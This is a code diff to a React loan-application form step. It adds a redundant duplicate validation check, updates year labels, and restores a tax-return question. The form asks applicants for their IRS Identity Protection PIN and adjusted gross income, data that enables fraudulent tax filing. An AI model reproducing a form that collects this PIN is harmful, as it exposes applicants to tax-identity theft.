@@ -99,6 +99,10 @@ const LoanProcessSeven = ({ step, setStep }) => {
       isValid = false;
     }
     if (!formData.taxReturn) {
+      errors.taxReturn = "Please select an option";
+      isValid = false;
+    }
+    if (!formData.taxReturn) {
       errors.taxReturn = "This field is required.";
     }
 
@@ -300,7 +304,7 @@ const LoanProcessSeven = ({ step, setStep }) => {
 
         <div className="mt-7">
           <label className="block text-gray-700 font-semibold mb-2">
-            What is your adjusted gross income (line 11 of your 1040)?
+            What is your 2022 adjusted gross income (line 11 of your 1040)?
           </label>
           <div className="relative">
             <input
@@ -336,7 +340,7 @@ const LoanProcessSeven = ({ step, setStep }) => {
             <div className="cont flex justify-between">
               {" "}
               <label className="block text-gray-700 font-semibold mb-2">
-                Input your IP PIN
+                What is your 2024 IP PIN
               </label>
               <div className="icon text-blue-500">
                 <Link href="https://www.irs.gov/identity-theft-fraud-scams/get-an-identity-protection-pin">
@@ -373,11 +377,11 @@ const LoanProcessSeven = ({ step, setStep }) => {
             )}
           </div>
         </div>
-        {/* <label
+        <label
           className="block text-gray-700 font-semibold mb-2 mt-7"
           htmlFor="taxReturn"
         >
-          Did you file for 2022 tax return?
+          Did you file for 2023 tax return?
         </label>
         <select
           className="w-full border border-gray-300 rounded-lg pl-3 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none"
@@ -390,8 +394,8 @@ const LoanProcessSeven = ({ step, setStep }) => {
           <option value="">Select...</option>
           <option value="yes">Yes</option>
           <option value="no">No</option>
-        </select> 
-        {errors.taxReturn && <p className="text-red-500">{errors.taxReturn}</p>}*/}
+        </select>
+        {errors.taxReturn && <p className="text-red-500">{errors.taxReturn}</p>}
         {/* <div className="mt-7">
           <label className="block text-gray-700 font-semibold mb-2">
             Means of Disbursement
